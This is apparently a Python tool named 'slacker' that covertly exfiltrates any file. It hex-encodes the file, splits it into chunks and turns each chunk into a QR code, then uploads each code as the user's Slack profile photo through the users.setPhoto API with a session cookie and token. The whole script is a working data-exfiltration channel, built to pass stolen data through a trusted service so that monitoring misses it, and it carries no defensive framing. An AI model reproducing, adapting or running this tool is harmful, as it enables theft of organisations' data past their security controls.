#!/usr/bin/env python3
import os
import sys
import math
import time
import segno
import re
import requests
from pyfiglet import Figlet
from io import BytesIO

def split_text_into_chunks(text, chunk_size):

    return [text[i:i+chunk_size] for i in range(0, len(text), chunk_size)]

def generate_qr_code(chunk_text):

    qr = segno.make(chunk_text, mode='alphanumeric')
    buf = BytesIO()
    # You can change dark/light colors here if desired.
    qr.save(buf, scale=10, dark='#000000', light='#222222', kind='png')
    buf.seek(0)
    return buf

def update_slack_photo(image_bytes, filename):
    """
    Replace the URL, token, cookies, and data with values valid for your Slack account.
    """
    url = ("https://workspace.slack.com/api/users.setPhoto")
    headers = {
        "user-agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                       "AppleWebKit/537.36 (KHTML, like Gecko) "
                       "Chrome/134.0.0.0 Safari/537.36")
    }
    cookies = {
         "d": ("cookie"),
    }
    
    data = {
        "token": "token",
        "id": "id",
    }

    files = {"image": (filename, image_bytes, "image/png")}
    response = requests.post(url, headers=headers, data=data, files=files, cookies=cookies)
    return response

def main():
    figlet = Figlet(font='bloody')
    text = "slacker"
 
    ascii_art = figlet.renderText(text)
    print("")
    print(ascii_art)

    if len(sys.argv) < 2:
        print("[?] Usage: python3 slack.py [file]")
        sys.exit(1)
 
    file_path = sys.argv[1]
    
    with open(file_path, "rb") as f:
        file_data = f.read()
    original_file_size = len(file_data)
    hex_string = file_data.hex().upper()
    
    header = f"{original_file_size:08X}"
    full_text = header + hex_string
    
    chunk_size = 4000
    chunks = split_text_into_chunks(full_text, chunk_size)
    success = '\"ok\":true'



    for i, chunk in enumerate(chunks):
        try:
            print(f"Processing chunk {i+1} of {len(chunks)}", end='\r', flush=True)
            image_bytes = generate_qr_code(chunk)
            filename = f"profile_{i+1:03d}.png"
            response = update_slack_photo(image_bytes, filename)
            #print(f"Uploaded chunk {i+1}: Slack responded with {response.status_code}")
            if success not in response.text:
                print(f"[!] Chunk {i+1} - Slack responded with {response.text}!")
        except KeyboardInterrupt:
            print("\n[!] Exiting...")
            print("")
            sys.exit(1)
   
    time.sleep(1)  # adjust delay as needed between updates

if __name__ == "__main__":
    main()
